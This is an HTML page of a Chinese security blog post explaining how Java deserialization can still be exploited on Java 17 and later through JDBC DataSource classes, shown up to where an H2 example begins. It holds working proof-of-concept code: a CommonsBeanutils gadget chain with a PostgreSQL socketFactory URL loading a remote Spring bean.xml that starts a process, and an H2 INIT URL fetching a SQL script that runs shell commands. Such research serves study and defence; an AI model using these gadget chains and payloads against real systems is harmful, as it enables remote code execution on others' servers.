@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+    
+    
+        
+            
+                <link rel="shortcut icon" href="/images/favicon.ico">
+            
+        
+        
+            
+                <link rel="icon" type="image/png" href="/images/favicon-140x140.png" sizes="192x192">
+            
+        
+        
+            
+                <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+            
+        
+    
+    <!-- title -->
+    <title>Java 17及更高版本中通过JDBC连接实现反序列化漏洞利用</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+    <link href="https://cdn.staticfile.org/firacode/6.2.0/fira_code.min.css" rel="stylesheet">
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+
+    <div id="header-post">
+    <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+    <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+    <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i
+                class="fas fa-chevron-up fa-lg"></i></a>
+    <span id="menu">
+    <span id="nav">
+      <ul>
+          
+              <!--<li><a href="/">首页</a></li>-->
+          
+              <!--<li><a href="/archives/">归档</a></li>-->
+          
+              <!--<li><a href="/categories/">分类</a></li>-->
+          
+              <!--<li><a href="/tags/">标签</a></li>-->
+          
+              <!--<li><a href="/about/">关于</a></li>-->
+          
+              <!--<li><a href="/search/">搜索</a></li>-->
+          
+      </ul>
+      <ul>
+        <a href="/">首页</a><a href="/archives">归档</a><a href="/categories">分类</a><a href="/tags">标签</a><a href="/about">关于</a><a href="/search">搜索</a>
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+          
+          
+              <li><a class="icon" href="/2023/02/21/%E6%B5%85%E6%9E%90Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Payload%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/"><i class="fas fa-chevron-right"
+                                                                           aria-hidden="true"
+                                                                           onmouseover="$('#i-next').toggle();"
+                                                                           onmouseout="$('#i-next').toggle();"></i></a></li>
+          
+          <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i
+                          class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();"
+                          onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true"
+                                        onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();"
+                                        onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+    <li><a class="icon"
+           target="_blank" rel="noopener" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.qwzf.top/2023/04/22/Java%2017%E5%8F%8A%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E9%80%9A%E8%BF%87JDBC%E8%BF%9E%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&title=Java 17及更高版本中通过JDBC连接实现反序列化漏洞利用"><i
+                    class="fab fa-qq " aria-hidden="true"></i></a></li>
+    <li><a class="icon"
+           target="_blank" rel="noopener" href="https://service.weibo.com/share/share.php?url=http://www.qwzf.top/2023/04/22/Java%2017%E5%8F%8A%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E9%80%9A%E8%BF%87JDBC%E8%BF%9E%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&title=Java 17及更高版本中通过JDBC连接实现反序列化漏洞利用"><i
+                    class="fab fa-weibo " aria-hidden="true"></i></a></li>
+    <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://www.qwzf.top/2023/04/22/Java%2017%E5%8F%8A%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E9%80%9A%E8%BF%87JDBC%E8%BF%9E%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&text=Java 17及更高版本中通过JDBC连接实现反序列化漏洞利用"><i
+                    class="fab fa-twitter " aria-hidden="true"></i></a></li>
+    <li><a class="icon" href="mailto:?subject=Java 17及更高版本中通过JDBC连接实现反序列化漏洞利用&body=Check out this article: http://www.qwzf.top/2023/04/22/Java%2017%E5%8F%8A%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E9%80%9A%E8%BF%87JDBC%E8%BF%9E%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"><i
+                    class="fas fa-envelope " aria-hidden="true"></i></a></li>
+</ul>
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Jigsaw%E9%A1%B9%E7%9B%AE%E5%92%8CJava%E6%A8%A1%E5%9D%97%E5%8C%96%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.</span> <span class="toc-text">1. Jigsaw项目和Java模块化系统</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Java%E5%8F%8D%E5%B0%84"><span class="toc-number">3.</span> <span class="toc-text">2. Java反射</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E4%B8%8D%E5%90%8CJava%E7%89%88%E6%9C%AC%E7%9A%84%E5%8F%8D%E5%B0%84%E8%AE%BF%E9%97%AE"><span class="toc-number">4.</span> <span class="toc-text">3. 不同Java版本的反射访问</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8JDBC%E8%BF%9E%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">4. 利用JDBC连接</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E7%A4%BA%E4%BE%8B1%EF%BC%9APostgeSQL-JDBC%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">5.1.</span> <span class="toc-text">4.1. 示例1：PostgeSQL JDBC驱动程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E7%A4%BA%E4%BE%8B2%EF%BC%9AH2-JDBC%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">5.2.</span> <span class="toc-text">4.2. 示例2：H2 JDBC驱动程序</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E5%88%A9%E7%94%A8JDBC%E6%B1%A0%E5%8C%96"><span class="toc-number">6.</span> <span class="toc-text">5. 利用JDBC池化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-%E7%A4%BA%E4%BE%8B1%EF%BC%9AC3PO-ComboPooledDataSource-%E5%92%8C-H2"><span class="toc-number">6.1.</span> <span class="toc-text">5.1. 示例1：C3PO ComboPooledDataSource 和 H2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-%E7%A4%BA%E4%BE%8B2%EF%BC%9AApache-Commons-DBCP2-%E5%92%8C-H2"><span class="toc-number">6.2.</span> <span class="toc-text">5.2. 示例2：Apache Commons DBCP2 和 H2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-%E5%85%B6%E4%BB%96"><span class="toc-number">7.</span> <span class="toc-text">6. 其他</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F%E8%AF%AD"><span class="toc-number">8.</span> <span class="toc-text">结束语</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+<div class="content index py4">
+    
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Java 17及更高版本中通过JDBC连接实现反序列化漏洞利用
+    </h1>
+
+      <div class="meta">
+        <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <span itemprop="name">
+            
+                  Qwzf
+                    
+          </span>
+        </span>
+        
+    <div class="postdate">
+        
+            <time datetime="2023-04-22T21:13:41.000Z"
+                  itemprop="datePublished">2023-04-22</time>
+            
+        
+    </div>
+
+          
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+    </div>
+
+            
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Bypass/" rel="tag">Bypass</a>, <a class="tag-link-link" href="/tags/JDBC/" rel="tag">JDBC</a>, <a class="tag-link-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+    </div>
+
+      </div>
+  </header>
+  
+    <div class="content" itemprop="articleBody">
+      <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于Java 16的变化，让原生反序列化漏洞的利用变得更加艰难。本文主要对参考链接中的思路进行研究学习，实现在Java 17及更高版本中的反序列化漏洞利用。</p>
+<h1 id="1-Jigsaw项目和Java模块化系统"><a href="#1-Jigsaw项目和Java模块化系统" class="headerlink" title="1. Jigsaw项目和Java模块化系统"></a>1. Jigsaw项目和Java模块化系统</h1><p>Java中的一个根本性的变化就是Java 模块化系统，在Java 9开始引入Java模块化系统和Jigsaw项目。</p>
+<p>Java 模块化系统，可以更好地控制JRE&#x2F;libraries的哪些部分由应用程序实际加载以及哪些部分可以通过其他模块访问。</p>
+<p>Java 模块化系统同时也提供了很多好处，比如：性能的改进。</p>
+<blockquote>
+<p>例如：如果要运行像 Apache Tomcat这样的服务，通常不会使用Java运行时的 GUI 组件，所以不需要首先对它们进行加载。甚至可以创建一个只包含应用程序实际使用的模块的简约JRE，非常适合基于容器的环境。</p>
+</blockquote>
+<h1 id="2-Java反射"><a href="#2-Java反射" class="headerlink" title="2. Java反射"></a>2. Java反射</h1><p>在Java 9之前，Java已经提供了某种隔离，主要由编译器强制执行：<code>无法从外部类访问标记为private/protected的方法和属性</code>。但这只是一种弱保护，因为它可以进行绕过。下面是将私有方法<code>internalMethod</code>公开并在之后进行调用的示例：</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PrivateObject</span> <span class="variable">privateObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrivateObject</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">internalMethod</span> <span class="operator">=</span> PrivateObject.class.</span><br><span class="line">   getDeclaredMethod(<span class="string">&quot;internalMethod&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">internalMethod.setAccessible(<span class="literal">true</span>); <span class="comment">//设置为允许访问</span></span><br><span class="line"><span class="type">String</span> <span class="variable">returnValue</span> <span class="operator">=</span> (String) internalMethod.invoke(privateObject, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>上面示例中，我们可以绕过模块隔离。因此，要实现一个健壮的Java模块系统，需要允许开发人员定义哪些代码可以从其他模块访问以及哪些部分可以<code>调用/通过</code>反射。定义是通过<code>module-info.java</code>文件来完成的。</p>
+<p>Java开发人员使用Java模块系统来<strong>封装在Java 运行时对不应直接从外部代码调用的内部类的反射访问</strong>。</p>
+<p>从攻击者的角度来看，由于许多已知的反序列化利用工具都采取反射的方法来实现远程代码执行，因此在引入Java模块系统之后，反序列化漏洞的利用成为了一个问题。</p>
+<h1 id="3-不同Java版本的反射访问"><a href="#3-不同Java版本的反射访问" class="headerlink" title="3. 不同Java版本的反射访问"></a>3. 不同Java版本的反射访问</h1><table>
+<thead>
+<tr>
+<th>Java版</th>
+<th>发布日期</th>
+<th>评论</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Java 9</td>
+<td>2017 年 9 月</td>
+<td>由编译器强制执行的反射访问限制，而不是运行时</td>
+</tr>
+<tr>
+<td>Java 11（长期支持版）</td>
+<td>2018 年 9 月</td>
+<td>非法反射访问会产生警告，但仍然允许</td>
+</tr>
+<tr>
+<td>Java 16</td>
+<td>2021 年 3 月</td>
+<td>在默认设置中阻止非法反射访问</td>
+</tr>
+</tbody></table>
+<p>在Java 17(2017 年 9 月发布)中，发布了第一个不再允许对内部Java类进行反射访问的 LTS 版本，由此防止在反序列化利用工具中对这些内部类进行使用。</p>
+<p><strong>例：在不同Java版本中CommonsBeanutils1的执行</strong></p>
+<p>可以使用ysoserial工具生成Gadget chain(下面截图是使用自己编写的代码生成Gadget chain并进行反序列化)</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0.0</span><span class="number">.6</span>-SNAPSHOT-all.jar CommonsBeanutils1 <span class="string">&quot;calc&quot;</span> &gt; ./testgadget </span><br></pre></td></tr></table></figure></div>
+
+<p>CommonBeanutils1允许攻击者在序列化类上调用getter方法，通常是使用<code>getters/setters</code>访问属性的Java bean。</p>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code>方法会调用</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() </span><br><span class="line">-&gt; TemplatesImpl#newTransformer() </span><br><span class="line">-&gt; TemplatesImpl#getTransletInstance() </span><br><span class="line">-&gt; TemplatesImpl#defineTransletClasses() </span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure></div>
+
+<p>来执行恶意字节码。</p>
+<p>（1）在Java 11环境中反序列化此对象，运行时会打印出警告，但Payload仍按预期工作，因为尚未强制执行模块访问限制；</p>
+<p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230418114411019.png" alt="image-20230418114411019"></p>
+<p>（2）在Java 17环境中，不再允许对内部类进行反射访问。因此，不再可能在<code>TemplatesImpl</code>类上调用方法。应用程序不执行Payload，而是抛出 IllegalAccessException</p>
+<p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230417152607006.png" alt="image-20230417152607006"></p>
+<p><code>TemplatesImpl</code>类是在大多数Java版本上执行代码的方法，因此被用作许多Gadget chain中的最终接收器。根据上面的内容，在 Java 17环境中，这些Gadget chain不再“开箱即用”。由此需要找到一种方法实现反序列化漏洞在Java 17及更高版本中的利用，由此有了下面的内容：</p>
+<h1 id="4-利用JDBC连接"><a href="#4-利用JDBC连接" class="headerlink" title="4. 利用JDBC连接"></a>4. 利用JDBC连接</h1><p>在Java17之前，已经遇到过类似的情况，如：目标应用使用Serialization Filtering，以防止使用TemplatesImpl类；</p>
+<p>Java 17仍然允许对这些类进行反序列化，但会阻止方法的调用。效果是类似的，都是阻止反序列化。</p>
+<blockquote>
+<p>上面提到：CommonsBeanutils1允许在可序列化类上调用JavaBean，即Getter方法(<code>getXXX</code>)。</p>
+<p>这种思路仍然可以在下面使用，只是不能再依赖Java运行时提供的对象。</p>
+</blockquote>
+<p>创建 JDBC连接有两种不同的方式：</p>
+<ul>
+<li><p>调用静态方法<code>DriverManager.getConnection()</code></p>
+</li>
+<li><p>使用实现<code>DataSource</code>接口的类。</p>
+</li>
+</ul>
+<blockquote>
+<p>由于 DriverManager 类不可序列化，所以我们主要关注DataSource实现：</p>
+<p>DataSource 接口要求实现提供一种getConnection()方法，于是可以使用它来定制CommonsBeanutils链的接收器(类似于TemplatesImpl类)。</p>
+</blockquote>
+<h2 id="4-1-示例1：PostgeSQL-JDBC驱动程序"><a href="#4-1-示例1：PostgeSQL-JDBC驱动程序" class="headerlink" title="4.1. 示例1：PostgeSQL JDBC驱动程序"></a>4.1. 示例1：PostgeSQL JDBC驱动程序</h2><p>PostgeSQLJDBCCB1.java</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PostgeSQLJDBCCB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">PGSimpleDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PGSimpleDataSource</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryClass</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryArg</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080/bean.xml&quot;</span>;</span><br><span class="line">        <span class="comment">//String jdbcUrl = &quot;jdbc:postgresql://localhost:5432/test/?socketFactory=&quot;+socketFactoryClass+ &quot;&amp;socketFactoryArg=&quot;+socketFactoryArg;</span></span><br><span class="line">        <span class="comment">//Connection connection = DriverManager.getConnection(jdbcUrl);</span></span><br><span class="line">        dataSource.setUrl(<span class="string">&quot;jdbc:postgresql://localhost:5432/test/?socketFactory=&quot;</span>+socketFactoryClass+ <span class="string">&quot;&amp;socketFactoryArg=&quot;</span>+socketFactoryArg);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造BeanComparator</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, java.util.Collections.reverseOrder());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造恶意PriorityQueue</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射将property的值设置成connection(即，调用getConnection())</span></span><br><span class="line">        Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;connection&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将恶意的dataSource对象写入到PriorityQueue的queue中</span></span><br><span class="line">        <span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueArray[<span class="number">0</span>] = dataSource;</span><br><span class="line">        queueArray[<span class="number">1</span>] = dataSource;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        ByteArrayOutputStream baos= <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>bean.xml(放到远程服务器上，这里我放到了<a target="_blank" rel="noopener" href="http://127.0.0.1:8008/bean.xml">http://127.0.0.1:8008/bean.xml</a>)</p>
+<div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--普通方式创建类--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;exec&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>在Java 17中，会抛出：</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.reflect.InaccessibleObjectException: Unable to make field transient java.lang.Object[] java.util.PriorityQueue.queue accessible: module java.base does not &quot;opens java.util&quot; to unnamed module @255316f2</span><br></pre></td></tr></table></figure></div>
+
+<p>解决方法：增加vm参数</p>
+<p>(IDEA中：Run—&gt;EditConfigurations…—&gt;Modify options—&gt;Add VM options—&gt;VM options)</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-opens java.base/java.util=ALL-UNNAMED</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230418152016103.png" alt="image-20230418152016103"></p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://pyn3rd.github.io/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/">Make JDBC Attacks Brilliant Again II</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11812">PostgresQL JDBC Drive 任意代码执行漏洞(CVE-2022-21724)</a></p>
+<h2 id="4-2-示例2：H2-JDBC驱动程序"><a href="#4-2-示例2：H2-JDBC驱动程序" class="headerlink" title="4.2. 示例2：H2 JDBC驱动程序"></a>4.2. 示例2：H2 JDBC驱动程序</h2><p>H2是内存数据库，通常用于演示。</p>
+<p>JDBC连接字符串允许使用SQL命令配置外部文件以通过<code>INIT</code>设置进行数据库初始化(即直接将下面内容填入h2的JDBC URL框中)：</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=<span class="number">3</span>;INIT=RUNSCRIPT FROM <span class="string">&#x27;http://127.0.0.1/poc.sql&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>H2提供的<code>compiler</code>功能，允许开发人员将自定义函数定义为 Java 代码。恶意INIT脚本可以滥用此功能来进行远程代码执行。</p>
+<p>poc.sql(放到远程服务器上，这里我放到了<a target="_blank" rel="noopener" href="http://127.0.0.1:8008/poc.sql">http://127.0.0.1:8008/poc.sql</a>)</p>
+<div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS SHELLEXEC <span class="keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException &#123;</span><br><span class="line">	java.util.Scanner s <span class="operator">=</span> <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="keyword">exec</span>(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">	<span class="keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;;  &#125;</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">&#x27;calc&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230419142925303.png" alt="image-20230419142925303"></p>
+<p>利用H2连接进行反序列化是困难的。原因：</p>
+<blockquote>
+<p>虽然H2数据库包含可序列化的DataSource实现(JdbcDataSource类)，但由于 JdbcDataSource类是TraceObject派生的，TraceObject类不能进行序列化。</p>
+<p>在反序列化的JdbcDataSource实例上调用<code>getConnection()</code>方法时，代码首先会尝试调用<code>debugCodeCall</code>方法，由于TraceObject类的必要属性未反序列化，所以调用<code>debugCodeCall</code>方法将会失败，从而利用H2连接进行反序列化是困难的。</p>
+</blockquote>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    debugCodeCall(<span class="string">&quot;getConnection&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JdbcConnection</span>(url, <span class="literal">null</span>, userName, StringUtils.cloneCharArray(passwordChars), <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>在以前的 Java 版本中，攻击者可以使用<code>JdbcRowSetImpl</code>类绕过此问题。Moritz Bechler提供了<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/CommonsBeanutils.java">CommonsBeanutils链的修改版本</a>，用来进行JNDI调用和创建JDBC连接，参考其思路，这里写了利用H2连接进行反序列化的示例代码：</p>
